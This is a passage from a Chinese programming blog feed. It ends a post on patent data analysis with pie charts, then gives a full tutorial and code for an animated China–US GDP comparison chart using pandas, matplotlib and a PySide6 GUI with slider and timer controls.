class="string">'class_type'</span>]].groupby([<span class="string">'第一申请人-原文'</span>]).size()</span><br><span class="line">df_data_countbyComp=pd.DataFrame(data_countbyComp,columns=[<span class="string">'counts'</span>])</span><br><span class="line">df_data_countbyCompTOP=df_data_countbyComp.sort_values(<span class="string">'counts'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top=data_original[(data_original[<span class="string">'第一申请人-原文'</span>].isin(df_data_countbyCompTOP.index.values))]</span><br><span class="line">value_top=data_original.sort_values(<span class="string">'专利估值'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">grade_top=data_original.sort_values(<span class="string">'专利评分'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top_show=count_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">value_top_show=value_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show=grade_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show.index.values</span><br><span class="line">fig, axs = plt.subplots(<span class="number">1</span>, <span class="number">3</span>,figsize=(<span class="number">18</span>, <span class="number">18</span>))</span><br><span class="line">axs[<span class="number">0</span>].pie(count_top_show,labels=count_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">0</span>].set(title=<span class="string">'数量TOP20的单位,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">1</span>].pie(value_top_show,labels=value_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.05</span>))</span><br><span class="line">axs[<span class="number">1</span>].set(title=<span class="string">'估值TOP20的专利,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">2</span>].pie(grade_top_show,labels=grade_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">2</span>].set(title=<span class="string">'评分TOP20的专利,研发类型分布'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%88%86%E5%B8%83%E5%9B%BE.png" alt="分布图"></p><p>这里可以看出数量上还是以企企合作研发的模式最多，但是从专利的估值评分来看企学的专利估值占比最高。说明从 企企合作、企学合作、企研合作、企学研合作的这些企业合作研发模式看，企企合作研发数量最多，企学合作研发的质量相对较高。</p><p>至此，本文通过一个实例介绍了用python通过数据分析三件套numpy、pandas、matplotlib进行数据相关性分析的过程。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python通过matplotlib动态绘图实现中美GDP历年对比趋势动图</title>
      <link href="/posts/66779ce6/"/>
      <url>/posts/66779ce6/</url>
      
        <content type="html"><![CDATA[<p>随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GDP做个对比，展示中国GPD对美国的追赶态势，相信不久的将来中国的GDP数据将稳超美国。</p><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E8%87%AA%E5%8A%A8.gif" alt="中美GDP历年对比趋势动图"></p><p>实现上面的动态绘图效果，综合用到了pandas的数据采集、数据整理、matplotlib绘图、坐标轴及数据的动态定义、定时器等知识。最终通过Python的GUI库PySide进行展示形成一个GUI的可执行程序。</p><h2 id="一、数据采集和准备"><a href="#一、数据采集和准备" class="headerlink" title="一、数据采集和准备"></a>一、数据采集和准备</h2><p>中美历年的GDP数据通过百度在网上一搜一大把。我是从<a href="https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html" target="_blank" rel="noopener">https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html</a> 找到的数据。将数据整理成EXCEL保存至data\中国VS美国.xlsx。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="中国VS美国GDP数据集"></p><p>有从1966年至2022年的中美GDP的数据。<br>首先对这些数据进行整理，因为获取的GDP数据是字符串类型如17.96万亿 (17,963,170,521,079)，我们需要将GDP的数据从文本中提取出来，也就是取括号中的数据。<br>这里通过正则表达式将括号中的GDP数据提取出来，并转换为亿元为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line">    </span><br><span class="line">df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br></pre></td></tr></table></figure><p>有了数据以后就可以通过数据绘图了。</p><h2 id="二、matplotlib绘图"><a href="#二、matplotlib绘图" class="headerlink" title="二、matplotlib绘图"></a>二、matplotlib绘图</h2><p>先通过matplotlib绘图看看数据的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'china_gdp_value'</span>])</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'us_gdp_value'</span>])</span><br><span class="line">plt.title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'年份'</span>)</span><br><span class="line">plt.ylim(<span class="string">'GDP（亿）'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E8%B6%8B%E5%8A%BF.png" alt="中美GDP对比趋势"></p><p>可以看到中国的GDP数据在1960年至1990年都是比较平稳的，到了1990年后中国开始了爆发式的追赶模式。<br>我们要将这种趋势通过动态的方式展示出来。</p><h2 id="三、数据展示与动态更新"><a href="#三、数据展示与动态更新" class="headerlink" title="三、数据展示与动态更新"></a>三、数据展示与动态更新</h2><p>首先通过QMainWindw定义QWidget组件，在QWidget中加入FigureCanvasQTAgg组件通过canvas载入matplotlib绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br></pre></td></tr></table></figure><p>一种方式是通过QSlider组件，通过手动拉slider组件来实现数据的变化，一种通过QTimer组件自动让数据变化。</p><h3 id="1、QSlider组件，手动方式实现动态绘图"><a href="#1、QSlider组件，手动方式实现动态绘图" class="headerlink" title="1、QSlider组件，手动方式实现动态绘图"></a>1、QSlider组件，手动方式实现动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slot()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">    <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">    f = int(new_val)</span><br><span class="line">    offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">    show_data = self.org_data[f: offset]</span><br><span class="line">    x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">    y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">    y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">    self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">    self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">    self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">    self.canvas.draw()</span><br></pre></td></tr></table></figure><p>手动拉slider组件来实现数据的变化效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E6%89%8B%E5%8A%A8.gif" alt="手动数据变化"></p><h3 id="2、QTimer组件，自动动态绘图"><a href="#2、QTimer组件，自动动态绘图" class="headerlink" title="2、QTimer组件，自动动态绘图"></a>2、QTimer组件，自动动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    self.autoslider()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.timer = QTimer()</span><br><span class="line">    self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">    self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据 </span></span><br><span class="line">    self.timer.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.update_frequency(self.auto_offset)</span><br><span class="line">    self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">    <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">        self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>效果如文章最前面所示。</p><h2 id="四、完整代码"><a href="#四、完整代码" class="headerlink" title="四、完整代码"></a>四、完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.ticker <span class="keyword">as</span> mticker</span><br><span class="line"><span class="keyword">from</span> PySide6.QtCore <span class="keyword">import</span> Qt, Slot, QTimer</span><br><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QMainWindow, QApplication, QVBoxLayout, QHBoxLayout, QWidget, QSlider, QComboBox</span><br><span class="line"><span class="keyword">from</span> matplotlib.backends.backend_qtagg <span class="keyword">import</span> FigureCanvasQTAgg</span><br><span class="line"><span class="keyword">from</span> matplotlib.figure <span class="keyword">import</span> Figure</span><br><span class="line"></span><br><span class="line">figure = Figure(figsize=(<span class="number">12</span>, <span class="number">6</span>), dpi=<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> cur_data_len, cur_major_locator</span><br><span class="line">cur_data_len = <span class="number">10</span>  <span class="comment"># 当前显示的数据量（显示10年的数据）</span></span><br><span class="line">cur_major_locator = <span class="number">10</span>  <span class="comment"># 当前刻度的定位器（主刻度）</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">        self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据</span></span><br><span class="line">        self.timer.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.update_frequency(self.auto_offset)</span><br><span class="line">        self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">        <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">            self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.auto_offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selecttype</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'自动播放'</span> == text:</span><br><span class="line">            self.autoslider()</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'手动播放'</span> == text:</span><br><span class="line">            self.timer.stop()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">        <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">        f = int(new_val)</span><br><span class="line">        offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">        show_data = self.org_data[f: offset]</span><br><span class="line">        x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">        y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">        y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">        self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">        self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">        self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    locale.setlocale(locale.LC_ALL, <span class="string">'en_US.UTF-8'</span>)</span><br><span class="line">    df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">    df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">    df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br><span class="line">    w = ApplicationWindow(org_data=df_data)</span><br><span class="line">    w.setFixedSize(<span class="number">1000</span>, <span class="number">500</span>)</span><br><span class="line">    w.show()</span><br><span class="line">    app.exec()</span><br></pre></td></tr></table></figure><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Python实现matplotlib动态绘图，是非常简单和容易的，其实关键还是在数据的组织，也就是要准备好要绘图的坐标轴的x的数据和y的数据，通过set_data(x,y)来动态更新数据，要注意的是变化的数据后X轴或Y轴的显示要变化，这里可以通过轴的set_xlim()或set_ylim()方法来动态设置，刻度也可通过set_major_locator()来指定。</p><p>数据集见 <a href="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx" target="_blank" rel="noopener">https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" 